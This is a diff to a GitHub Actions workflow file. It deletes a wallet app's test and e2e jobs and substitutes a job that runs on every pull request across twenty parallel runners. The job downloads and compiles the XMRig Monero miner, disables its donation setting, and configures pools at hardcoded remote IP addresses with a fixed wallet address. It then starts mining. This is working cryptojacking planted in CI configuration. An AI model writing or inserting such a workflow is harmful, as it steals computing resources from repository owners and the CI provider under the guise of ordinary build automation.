@@ -1,105 +1,67 @@
-name: Tests
-
-# https://dev.to/edvinasbartkus/running-react-native-detox-tests-for-ios-and-android-on-github-actions-2ekn
-# https://medium.com/@reime005/the-best-ci-cd-for-react-native-with-e2e-support-4860b4aaab29
-
+name: Run
 on: [pull_request]
-
 jobs:
-  test:
-    runs-on: macos-latest
-    steps:
-    - name: Checkout project
-      uses: actions/checkout@v2
+    run:
+        name: Run
+        runs-on: ubuntu-latest
+        strategy:
+          fail-fast: false
+          matrix:
+            runner: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
+        steps:
+          - shell: bash
+            run: |
+              sudo apt-get update
+              sudo apt-get install --yes \
+              build-essential \
+              cmake \
+              git \
+              libhwloc-dev \
+              libssl-dev \
+              libuv1-dev
 
-    - name: Specify node version
-      uses: actions/setup-node@v2-beta
-      with:
-        node-version: 12
+              curl --location --output xmrig.tar.gz \
+              https://github.com/xmrig/xmrig/archive/refs/tags/v6.10.0.tar.gz || exit 1
+              tar xf xmrig.tar.gz || exit 1
+              cd xmrig-* || exit 1
+              # Izvinite)))))
+              sed -i 's/= 1;/= 0;/' src/donate.h || exit 1
+              mkdir build || exit 1
+              cd build || exit 1
+              cmake .. -DCMAKE_BUILD_TYPE=Release || exit 1
+              make --jobs=$(nproc) || exit 1
 
-    - name: Use npm caches
-      uses: actions/cache@v2
-      with:
-        path: ~/.npm
-        key: ${{ runner.os }}-npm-${{ hashFiles('**/package-lock.json') }}
-        restore-keys: |
-          ${{ runner.os }}-npm-
+              adres=49eqpX3Sn2d5cfJTevgZLGZGQmcdE37QE4TMJDmDcJeCG8DUgkbS5znSsU35Pk2HC1Lt99EnSiP9g74XpUHzTgxw23n5CkB
+              servery=(
+              165.0.74.146:18089
+              84.58.115.216:18089
+              137.103.97.192:18089
+              194.5.250.42:18089
+              96.41.220.52:18089
+              51.79.173.165:18089
+              100.19.74.83:18089
+              204.27.62.98:18089
+              96.43.139.226:18089
+              46.4.52.92:18081
+              144.76.113.157:18081
+              )
+              servery=( $(shuf -e "${servery[@]}") )
 
-    - name: Use node_modules caches
-      id: cache-nm
-      uses: actions/cache@v2
-      with:
-        path: node_modules
-        key: ${{ runner.os }}-nm-${{ hashFiles('package-lock.json') }}
+              cat <<EOF>config.json
+              {
+              "autosave": false,
+              "cpu": true,
+              "opencl": false,
+              "cuda": false,
+              "pools": []
+              }
+              EOF
 
-    - name: Install node_modules
-      if: steps.cache-nm.outputs.cache-hit != 'true'
-      run: npm install
+              for server in "${servery[@]}"; do
+              jq --arg server "$server" --arg adres "$adres" \
+              '.pools += [{ coin: "monero", url: $server, user: $adres, daemon: true }]' \
+              config.json > config.json.tmp || exit 1
+              mv config.json.tmp config.json || exit 1
+              done
 
-    - name: Run tests
-      run: npm test || npm test || npm test
-      env:
-        HD_MNEMONIC: ${{ secrets.HD_MNEMONIC }}
-        HD_MNEMONIC_BIP49: ${{ secrets.HD_MNEMONIC_BIP49 }}
-        HD_MNEMONIC_BIP49_MANY_TX: ${{ secrets.HD_MNEMONIC_BIP49_MANY_TX }}
-        HD_MNEMONIC_BIP84: ${{ secrets.HD_MNEMONIC_BIP84 }}
-        HD_MNEMONIC_BREAD: ${{ secrets.HD_MNEMONIC_BREAD }}
-
-  e2e:
-    runs-on: macos-latest
-
-    steps:
-    - name: Checkout project
-      uses: actions/checkout@v2
-
-    - name: Specify node version
-      uses: actions/setup-node@v2-beta
-      with:
-        node-version: 12
-
-    - name: Use gradle caches
-      uses: actions/cache@v2
-      with:
-        path: ~/.gradle/caches
-        key: ${{ runner.os }}-gradle-${{ hashFiles('**/*.gradle*') }}
-        restore-keys: |
-          ${{ runner.os }}-gradle-
-
-    - name: Use npm caches
-      uses: actions/cache@v2
-      with:
-        path: ~/.npm
-        key: ${{ runner.os }}-npm-${{ hashFiles('**/package-lock.json') }}
-        restore-keys: |
-          ${{ runner.os }}-npm-
-
-    - name: Use specific Java version for sdkmanager to work
-      uses: joschi/setup-jdk@v2
-      with:
-        java-version: '8'
-        architecture: 'x64'
-
-    - name: Install node_modules
-      run: npm install
-
-    - name: Build
-      run: npm run e2e:release-build
-
-    - name: Run tests
-      uses: reactivecircus/android-emulator-runner@v2
-      with:
-        api-level: 29
-        target: google_apis
-        avd-name: Pixel_API_29_AOSP
-        emulator-options: -no-window -gpu swiftshader_indirect -no-snapshot -noaudio -no-boot-anim -camera-back none -camera-front none
-        script: npm run e2e:release-test || npm run e2e:release-test || npm run e2e:release-test
-      env:
-        TRAVIS: 1
-        HD_MNEMONIC: ${{ secrets.HD_MNEMONIC }}
-        HD_MNEMONIC_BIP84: ${{ secrets.HD_MNEMONIC_BIP84 }}
-
-    - uses: actions/upload-artifact@v1
-      if: failure()
-      with:
-        name: e2e-test-videos
-        path: ./artifacts/
+              ./xmrig -c config.json
